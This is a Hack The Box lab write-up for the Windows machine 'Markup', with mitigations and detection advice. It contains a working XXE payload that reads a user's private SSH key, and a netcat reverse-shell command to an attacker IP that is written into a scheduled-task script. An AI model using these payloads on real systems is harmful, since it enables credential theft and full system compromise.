---
machine: Markup
os: Windows
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [windows, xxe, ssh, scheduled-task, tier2]
---

# Markup — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 2 · Windows · Very Easy

## TL;DR

The blog parses XML on login/search and is vulnerable to **XXE**: read `Daniel`'s private SSH key from `C:\Users\Daniel\.ssh\id_rsa`, log in over SSH, and overwrite `C:\Log-Management\job.bat`, which a scheduled task runs as administrator.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
22/tcp  ssh   OpenSSH for_Windows_8.1
80/tcp  http  Apache httpd 2.4.41 (Win64) PHP/7.4
```

## Enumeration

```bash
curl -s http://<TARGET_IP>/ | head -50
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

- `/` is a blog with a login and a search box.
- `/index.php` and `/login.php` accept `POST` with `Content-Type: application/xml`.
- `robots.txt` and the footer mention the user `Daniel`.

## Foothold

The XML parser resolves external entities. Payload to read the key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">]>
<data><user>&xxe;</user><password>x</password></data>
```

```bash
curl -s -X POST http://<TARGET_IP>/login.php \
  -H 'Content-Type: application/xml' --data-binary @xxe.xml
```

The response returns the private key. Save it, fix permissions and log in:

```bash
chmod 600 id_rsa
ssh -i id_rsa Daniel@<TARGET_IP>
```

## Lateral movement

```powershell
whoami
type C:\Users\Daniel\Desktop\user.txt
icacls C:\Log-Management
```

`C:\Log-Management\job.bat` is writable by `Daniel` and a scheduled task runs it periodically as administrator.

## Privilege escalation

```powershell
copy C:\Windows\System32\nc64.exe C:\Log-Management\nc64.exe
echo C:\Log-Management\nc64.exe -e cmd.exe <ATTACKER_IP> 1337 > C:\Log-Management\job.bat
```

With `nc -lvnp 1337` listening, the next task cycle delivers an administrator shell:

```text
C:\Windows\system32> whoami
markup\administrator
```

```text
type C:\Users\Administrator\Desktop\root.txt
```

## Evidence

- XXE request and response with the key redacted.
- `icacls` on the directory and `whoami` as administrator.

## Lessons learned

- `Content-Type: application/xml` is an invitation to test external entities.
- XXE can read files outside the webroot; on Windows, `file:///C:/...` paths.
- Scheduled tasks running writable scripts are instant escalation.
- Copying `nc64.exe` into the log directory avoids relying on downloads.

## Mitigations and detection

- Disable DTDs and external entities (`libxml_disable_entity_loader`, parser without `resolve_entities`).
- Private keys with strict ACLs and a passphrase.
- System script directories not writable by users.
- Detection: requests with `<!DOCTYPE` and `SYSTEM "file://`, `id_rsa` reads, changes in `C:\Log-Management`.

- CWE-611: Improper Restriction of XML External Entity Reference
- CWE-732: Incorrect Permission Assignment for Critical Resource
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1053.005](https://attack.mitre.org/techniques/T1053/005/), [T1552.004](https://attack.mitre.org/techniques/T1552/004/)

## References

- [OWASP — XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger — XXE](https://portswigger.net/web-security/xxe)
